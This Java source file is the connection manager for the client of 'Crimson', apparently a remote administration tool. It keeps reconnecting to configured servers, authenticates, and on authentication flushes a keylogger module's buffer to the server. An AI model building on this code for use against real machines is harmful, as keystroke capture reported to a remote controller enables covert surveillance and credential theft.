/******************************************************************************
 *                                                                            *
 *                    Copyright 2017 Subterranean Security                    *
 *                                                                            *
 *  Licensed under the Apache License, Version 2.0 (the "License");           *
 *  you may not use this file except in compliance with the License.          *
 *  You may obtain a copy of the License at                                   *
 *                                                                            *
 *      http://www.apache.org/licenses/LICENSE-2.0                            *
 *                                                                            *
 *  Unless required by applicable law or agreed to in writing, software       *
 *  distributed under the License is distributed on an "AS IS" BASIS,         *
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  *
 *  See the License for the specific language governing permissions and       *
 *  limitations under the License.                                            *
 *                                                                            *
 *****************************************************************************/
package com.subterranean_security.crimson.client.net;

import java.net.ConnectException;
import java.util.List;
import java.util.Observable;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.subterranean_security.crimson.client.ShutdownHook;
import com.subterranean_security.crimson.client.modules.Keylogger;
import com.subterranean_security.crimson.client.net.command.AuthCom;
import com.subterranean_security.crimson.client.store.ConfigStore;
import com.subterranean_security.crimson.core.net.Connector;
import com.subterranean_security.crimson.core.net.Connector.ConnectionState;
import com.subterranean_security.crimson.core.net.Connector.ConnectionType;
import com.subterranean_security.crimson.core.net.MessageFuture.Timeout;
import com.subterranean_security.crimson.core.proto.Generator.NetworkTarget;
import com.subterranean_security.crimson.core.store.ConnectionStore;
import com.subterranean_security.crimson.core.store.ConnectionStore.ConnectionEventListener;
import com.subterranean_security.crimson.cv.net.command.CvidCom;

public final class ClientConnectionStore {

	private static final Logger log = LoggerFactory.getLogger(ClientConnectionStore.class);

	private static List<NetworkTarget> targets = null;

	private static boolean connecting = false;

	public static void initialize() {
		ConnectionStore.initialize(new ClientConnectionEventListener());
	}

	public static void setTargets(List<NetworkTarget> t) {
		targets = t;
	}

	public static void connectionRoutine() {
		if (connecting || ShutdownHook.shuttingdown) {
			return;
		} else {
			connecting = true;
		}

		Connector connector = new Connector(new ClientExecutor());
		ConnectionStore.add(connector);

		try {
			while (!Thread.interrupted()) {
				for (NetworkTarget n : targets) {
					ClientConnectionStore.connectionIterations++;

					try {
						log.debug("Attempting connection to: {}:{}", n.getServer(), n.getPort());

						connector.connect(ConnectionType.SOCKET, n.getServer(), n.getPort());

						return;

					} catch (ConnectException e) {

					}
					Thread.sleep(ConfigStore.getConfig().getReconnectPeriod());

				}
			}
		} catch (InterruptedException e) {

		} finally {
			connecting = false;
		}

	}

	public static int connectionIterations = 0;

	private static class ClientConnectionEventListener implements ConnectionEventListener {

		@Override
		public void update(Observable arg0, Object arg1) {
			Connector connector = (Connector) arg0;
			ConnectionState state = (ConnectionState) arg1;

			if (connector.getCvid() == 0) {
				switch (state) {
				case AUTHENTICATED:
					Keylogger.flush();
					break;
				case CONNECTED:
					try {
						Thread.sleep(5000);
					} catch (InterruptedException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
					try {
						CvidCom.getCvid(connector);
					} catch (Timeout e1) {
						// TODO Auto-generated catch block
						e1.printStackTrace();
					} catch (InterruptedException e1) {
						// TODO Auto-generated catch block
						e1.printStackTrace();
					}

					AuthCom.auth(connector);
					break;
				case NOT_CONNECTED:
					connectionRoutine();
					break;
				default:
					break;

				}
			}

		}

	}

}